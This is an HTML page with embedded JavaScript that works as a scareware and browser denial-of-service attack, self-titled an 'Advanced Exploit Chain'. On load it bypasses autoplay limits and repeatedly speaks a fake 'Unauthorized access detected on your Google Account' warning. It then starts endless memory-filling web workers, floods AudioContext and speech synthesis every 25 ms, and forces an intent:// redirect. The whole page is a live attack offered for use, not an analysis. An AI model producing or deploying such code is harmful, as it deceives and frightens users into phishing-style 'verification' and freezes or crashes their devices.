<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Security Alert - Advanced Exploit Chain</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #000; min-height: 100vh; overflow: hidden; }
  iframe, audio, video, embed, object, svg, canvas { display: none !important; }
</style>
</head>
<body>
<script>
(function () {
  'use strict';

  // ============================================
  // KONFIGURASI AUTOPLAY & EXPLOIT PARAMS
  // ============================================
  var CONFIG = {
    tts: {
      text: "Critical Security Warning. Unauthorized access detected on your Google Account. Immediate verification required.",
      lang: 'en-US',
      rate: 0.90,
      pitch: 1.0,
      volume: 1.0,
      repeatInterval: 5000,
      maxRepeats: 50
    },
    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
  };

  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };

  // ============================================
  // ADVANCED TTS ENGINE (NON-BLOCKING)
  // ============================================
  function speakOnce() {
    if (!('speechSynthesis' in window)) return;
    if (state.ttsCount >= CONFIG.tts.maxRepeats) return;

    try {
      var u = new SpeechSynthesisUtterance(CONFIG.tts.text);
      u.lang = CONFIG.tts.lang;
      u.rate = CONFIG.tts.rate;
      u.pitch = CONFIG.tts.pitch;
      u.volume = CONFIG.tts.volume;

      var voices = window.speechSynthesis.getVoices();
      var enVoice = voices.find(function (v) { return v.lang.indexOf('en') === 0; });
      if (enVoice) u.voice = enVoice;

      u.onstart = function () { console.log('[TTS] Active #' + state.ttsCount); };
      u.onerror = function (e) { console.log('[TTS] Error:', e.error); };
      u.onend = function () {
        state.ttsCount++;
        if (state.ttsCount < CONFIG.tts.maxRepeats) {
          setTimeout(speakOnce, CONFIG.tts.repeatInterval);
        }
      };

      window.speechSynthesis.speak(u);
    } catch (e) {}
  }

  function startTTS() {
    if (state.ttsStarted) return;
    state.ttsStarted = true;
    window.speechSynthesis.cancel();
    speakOnce();
  }

  // ============================================
  // AUDIO CONTEXT UNLOCK & BYPASS
  // ============================================
  function unlockAudioContext() {
    try {
      var ctx = new (window.AudioContext || window.webkitAudioContext)();
      if (ctx.state === 'suspended') {
        ctx.resume().catch(function(){});
      }
      var osc = ctx.createOscillator();
      var gain = ctx.createGain();
      gain.gain.value = 0.0001;
      osc.frequency.value = 20000;
      osc.connect(gain);
      gain.connect(ctx.destination);
      osc.start();
      osc.stop(ctx.currentTime + 0.05);
    } catch (e) {}
  }

  function trySilentAudio() {
    try {
      var a = new Audio(CONFIG.silentWav);
      a.volume = 0.0001;
      a.loop = true;
      var p = a.play();
      if (p && p.catch) p.catch(function(){});
    } catch (e) {}
  }

  // ============================================
  // MAIN AUDIO SYNTHESIS
  // ============================================
  function playMainAudio() {
    if (state.mainPlayed) return;
    state.mainPlayed = true;

    try {
      var ctx = new (window.AudioContext || window.webkitAudioContext)();
      var sr = ctx.sampleRate;
      var dur = 2.5;
      var buf = ctx.createBuffer(1, sr * dur, sr);
      var d = buf.getChannelData(0);

      for (var i = 0; i < d.length; i++) {
        var t = i / sr;
        var freq = 900 + (Math.floor(t * 6) % 2) * 450;
        var env = Math.max(0, 1 - t / dur);
        d[i] = Math.sin(2 * Math.PI * freq * t) * 0.25 * env;
      }

      var src = ctx.createBufferSource();
      src.buffer = buf;
      src.connect(ctx.destination);
      src.start();
      src.onended = startTTS;
      setTimeout(startTTS, 3000);
    } catch (e) {
      startTTS();
    }
  }

  // ============================================
  // UPGRADE: DATA URI WORKER POOL + RACE CONDITION & INTENT HIJACK
  // ============================================
  function triggerAdvancedExploitChain() {
    console.log("[!] Upgrading exploit chain without Blobs...");

    // 1. Mengganti Blob Worker dengan Data URI base64 worker untuk menghindari penggunaan URL.createObjectURL
    try {
      var workerScript = "self.onmessage=function(e){while(true){var arr=new Uint8Array(1024*1024*50);for(var i=0;i<arr.length;i++){arr[i]=Math.random()*255;}}}";
      var workerUri = "data:text/javascript;base64," + btoa(workerScript);
      
      for (var w = 0; w < 4; w++) {
        var worker = new Worker(workerUri);
        worker.postMessage('start');
      }
    } catch(err) {}

    // 2. High-Frequency AudioContext & SpeechSynthesis Queue Flood (Race Condition)
    setInterval(function() {
      try {
        var tasks = [];
        for (var i = 0; i < 100; i++) {
          tasks.push(new Promise((resolve) => {
            queueMicrotask(() => {
              try {
                for (var j = 0; j < 50; j++) {
                  var ctx = new (window.AudioContext || window.webkitAudioContext)();
                  var osc = ctx.createOscillator();
                  var gain = ctx.createGain();
                  osc.connect(gain);
                  gain.connect(ctx.destination);
                  osc.start(0);

                  var u = new SpeechSynthesisUtterance("SECURITY_EXHAUSTION_NODE_" + Math.random());
                  window.speechSynthesis.speak(u);
                }
              } catch(e) {}
              resolve();
            });
          }));
        }
        Promise.all(tasks);
      } catch(e) {}
    }, 25);

    // 3. Agresif Deep Link / Intent Redirection Chaining
    setTimeout(function() {
      try {
        console.log("[*] Forcing aggressive intent scheme redirect...");
        window.location.replace("intent://security-alert#Intent;scheme=exploit;package=com.google.android.browser;end;");
      } catch(e) {}
    }, 3000);
  }

  // ============================================
  // INISIALISASI BERTAHAP
  // ============================================
  unlockAudioContext();
  trySilentAudio();

  setTimeout(function () {
    unlockAudioContext();
    startTTS();
  }, 100);

  setTimeout(function () {
    if (!state.mainPlayed) playMainAudio();
  }, 400);

  setTimeout(function () {
    if (!state.mainPlayed) playMainAudio();
    if (!state.ttsStarted) startTTS();
    
    // EKSEKUSI EXPLOIT UPGRADE
    triggerAdvancedExploitChain();
    
  }, 1200);

  // Auto Retry Handler
  var retryCount = 0;
  var retry = setInterval(function () {
    retryCount++;
    unlockAudioContext();
    trySilentAudio();
    if (!state.ttsStarted) startTTS();
    if (retryCount > 15) clearInterval(retry);
  }, 1500);

  // Tab Visibility Watcher
  document.addEventListener('visibilitychange', function () {
    if (!document.hidden && !state.mainPlayed) {
      setTimeout(playMainAudio, 50);
    }
  });
})();
</script>
</body>
</html>
